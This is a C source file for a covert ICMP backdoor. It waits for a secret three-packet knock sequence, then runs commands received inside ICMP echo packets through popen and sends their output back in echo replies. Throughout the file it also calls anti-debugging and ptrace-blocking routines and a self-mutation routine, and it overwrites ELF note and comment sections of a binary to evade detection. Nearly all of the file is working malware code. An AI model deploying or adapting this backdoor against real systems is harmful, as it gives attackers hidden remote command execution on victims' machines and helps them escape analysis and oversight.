#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h> 
#include <errno.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <signal.h>
#include "includes/icmp_common.h"

#define PORT_TO_KNOCK 12345
#define EXPECTED_SEQUENCE_SIZE 3
#define BUFSIZE 1024

extern void anti_debug(void);        
extern void check_tracer_pid(void);
extern void block_ptrace_attaches(void);
extern void install_seccomp_ptrace_kill(void);
extern int mutate_main(void);

const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
    "nqXCT2xfFsvYktHG3d8gPV",
    "VqhEGfaeFTdSmUW7M4QkNz",
    "VXjdmp4QcBtH75S2Yf8gPx"
};

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void patch_note_section(FILE *f) {
    Elf64_Ehdr ehdr;
    fread(&ehdr, 1, sizeof(ehdr), f);
    fseek(f, ehdr.e_shoff, SEEK_SET);

    Elf64_Shdr shdr;
    char shstrtab[4096] = {0};

    fseek(f, ehdr.e_shoff + ehdr.e_shentsize * ehdr.e_shstrndx, SEEK_SET);
    fread(&shdr, 1, sizeof(shdr), f);
    fseek(f, shdr.sh_offset, SEEK_SET);
    fread(shstrtab, 1, sizeof(shstrtab) - 1, f);

    for (int i = 0; i < ehdr.e_shnum; ++i) {
        fseek(f, ehdr.e_shoff + i * ehdr.e_shentsize, SEEK_SET);
        fread(&shdr, 1, sizeof(shdr), f);
        const char *name = &shstrtab[shdr.sh_name];
        if (strcmp(name, ".note.ABI-tag") == 0 || strcmp(name, ".comment") == 0) {
            fseek(f, shdr.sh_offset, SEEK_SET);
            char junk[] = "RANDOMIZED-SECTION\0";
            fwrite(junk, 1, sizeof(junk) - 1, f);
            break;
        }
    }
}

// Send ICMP response with payload
int send_icmp_response(int sock, struct sockaddr_in *client_addr, const char *data, int data_len, uint16_t original_id) {
    char packet[BUFSIZE];
    struct icmp_header *icmp_hdr = (struct icmp_header *)packet;
    
    // Build ICMP echo reply
    icmp_hdr->type = ICMP_ECHOREPLY;
    icmp_hdr->code = 0;
    icmp_hdr->un.echo.id = original_id;
    icmp_hdr->un.echo.sequence = 0;
    
    // Copy data to payload
    if (data_len > 0 && data_len < (int)(BUFSIZE - sizeof(struct icmp_header))) {
        memcpy(packet + sizeof(struct icmp_header), data, data_len);
    }
    
    // Calculate checksum
    icmp_hdr->checksum = 0;
    icmp_hdr->checksum = checksum((unsigned short *)icmp_hdr, 
                                 sizeof(struct icmp_header) + data_len);
    
    // Send the packet
    return sendto(sock, packet, sizeof(struct icmp_header) + data_len, 0,
                 (struct sockaddr *)client_addr, sizeof(struct sockaddr_in));
}

// Handle ICMP shell commands
void handle_icmp_shell(int sock, struct sockaddr_in client_addr) {
    char buffer[BUFSIZE];
    socklen_t addr_len = sizeof(client_addr);

    while (1) {
        memset(buffer, 0, BUFSIZE);

        ssize_t n = recvfrom(sock, buffer, BUFSIZE, 0,
                           (struct sockaddr *)&client_addr, &addr_len);
        if (n <= 0) {
            if (errno == EINTR) continue;
            printf("[*] Error receiving packet: %s\n", strerror(errno));
            break;
        }

        struct iphdr *ip_header = (struct iphdr *)buffer;
        int ip_header_len = ip_header->ihl * 4;

        if (n < ip_header_len + (int)sizeof(struct icmp_header)) {
            continue;
        }

        struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);

        if (icmp_hdr->type != ICMP_ECHO) {
            continue;
        }

        uint16_t original_id = icmp_hdr->un.echo.id;

        char *payload_start = (char *)(icmp_hdr + 1);
        int total_payload_len = n - ip_header_len - sizeof(struct icmp_header);

        // Only process packets with custom header
        if (total_payload_len < (int)sizeof(struct custom_icmp_header)) {
            continue;
        }

        struct custom_icmp_header *custom_hdr = (struct custom_icmp_header *)payload_start;
        if (ntohl(custom_hdr->magic) != 0xDEADBEEF) {
            continue;
        }

        char *command = payload_start + sizeof(struct custom_icmp_header);
        int command_len = total_payload_len - sizeof(struct custom_icmp_header);

        if (command_len > 0) {
            char command_buffer[BUFSIZE];
            memcpy(command_buffer, command, command_len);
            command_buffer[command_len] = '\0';

            if (strcmp(command_buffer, "exit") == 0) {
                printf("[*] Client requested exit. Returning to knock mode.\n");
                const char *msg = "Shell session terminated.\n";
                send_icmp_response(sock, &client_addr, msg, strlen(msg), original_id);
                return;
            }

            FILE *fp = popen(command_buffer, "r");
            if (!fp) {
                const char *err = "Failed to run command\n";
                send_icmp_response(sock, &client_addr, err, strlen(err), original_id);
            } else {
                char line[BUFSIZE];
                while (fgets(line, sizeof(line), fp)) {
                    line[strcspn(line, "\n")] = 0;
                    send_icmp_response(sock, &client_addr, line, strlen(line), original_id);
                    usleep(10000);
                }
                pclose(fp);
            }

            send_icmp_response(sock, &client_addr, "__END__", strlen("__END__"), original_id);
        }
    }
}

int main() {
    int sock;
    struct sockaddr_in servaddr, cliaddr;
    socklen_t len;
    char buffer[BUFSIZE];
    int sequenceIndex = 0;
    int shell_mode = 0;
    struct sockaddr_in shell_client;
    
    anti_debug();

    FILE *f = fopen("/usr/bin/hoxha", "r+b");
    if (f) {
        patch_note_section(f);
        fclose(f);
    }

    // Create raw socket for ICMP
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { error("socket"); }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        error("bind");
    }

    printf("Listening for ICMP knocks...\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        len = sizeof(cliaddr);

        ssize_t n = recvfrom(sock, buffer, sizeof(buffer) - 1, 0,
                             (struct sockaddr *)&cliaddr, &len);
        if (n < 0) { error("recvfrom"); }

        // If we're in shell mode, handle the command
        if (shell_mode) {
            // Check if this is from the same client
            if (cliaddr.sin_addr.s_addr == shell_client.sin_addr.s_addr) {
                // Extract ICMP payload to check if it's a knock sequence
                struct iphdr *ip_header = (struct iphdr *)buffer;
                int ip_header_len = ip_header->ihl * 4;
                
                if (n >= ip_header_len + (int)sizeof(struct icmp_header)) {
                    struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);
                    
                    if (icmp_hdr->type == ICMP_ECHO) {
                        char *payload = (char *)(icmp_hdr + 1);
                        int payload_len = n - ip_header_len - sizeof(struct icmp_header);
                        
                        if (payload_len > 0) {
                            payload[payload_len] = '\0';
                            
                            // Check if this is a knock sequence packet
                            int is_knock = 0;
                            for (int i = 0; i < EXPECTED_SEQUENCE_SIZE; i++) {
                                if (strcmp(payload, EXPECTED_SEQUENCE[i]) == 0) {
                                    is_knock = 1;
                                    break;
                                }
                            }
                            // If it's a knock sequence, ignore it
                            if (is_knock) {
                                continue;
                            }
                        }
                    }
                }
                
                // Process as a shell command
                handle_icmp_shell(sock, cliaddr);
                // After shell session ends, return to knock mode
                shell_mode = 0;
                sequenceIndex = 0;
            }
            continue;
        }

	// Not in shell mode - process knock sequence
	// Extract ICMP payload (skip IP header + ICMP header)
	struct iphdr *ip_header = (struct iphdr *)buffer;
	int ip_header_len = ip_header->ihl * 4;

	if (n < (ssize_t)(ip_header_len + sizeof(struct icmp_header))) {
	    continue; // Not a complete ICMP packet
	}

	struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);

	// Only process echo requests (ICMP_ECHO)
	if (icmp_hdr->type != ICMP_ECHO) {
	    continue;
	}

	char *payload = (char *)(icmp_hdr + 1);
	int payload_len = n - ip_header_len - sizeof(struct icmp_header);

	if (payload_len > 0) {
	    payload[payload_len] = '\0';
    
	    // Check if this is a shell command (has custom header)
	    if (payload_len >= (int)sizeof(struct custom_icmp_header)) {
	        struct custom_icmp_header *custom_hdr = (struct custom_icmp_header *)payload;
	        if (ntohl(custom_hdr->magic) == 0xDEADBEEF) {
	            // This is a shell command, ignore in knock mode
	            continue;
	        }
    	}
    
	    // Process as knock sequence
	    if (strcmp(payload, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
	        sequenceIndex++;
        
	        if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
	            printf("[*] Correct sequence received. Entering shell mode…\n");
	            shell_mode = 1;
	            shell_client = cliaddr;
            
	            // Send acknowledgment
	            const char *msg = "Shell access granted.\n";
	            send_icmp_response(sock, &cliaddr, msg, strlen(msg), icmp_hdr->un.echo.id);
            
	            // Handle shell commands
	            handle_icmp_shell(sock, cliaddr);
            
	            // Return to knock mode after shell session
	            shell_mode = 0;
	            sequenceIndex = 0;
	            printf("[*] Returning to knock mode.\n");
	        } 
	    } else {
	        sequenceIndex = 0;
	        printf("[*] Invalid knock sequence. Resetting.\n");
	    }
	}
        mutate_main();
    }
    close(sock);
    return 0;
}
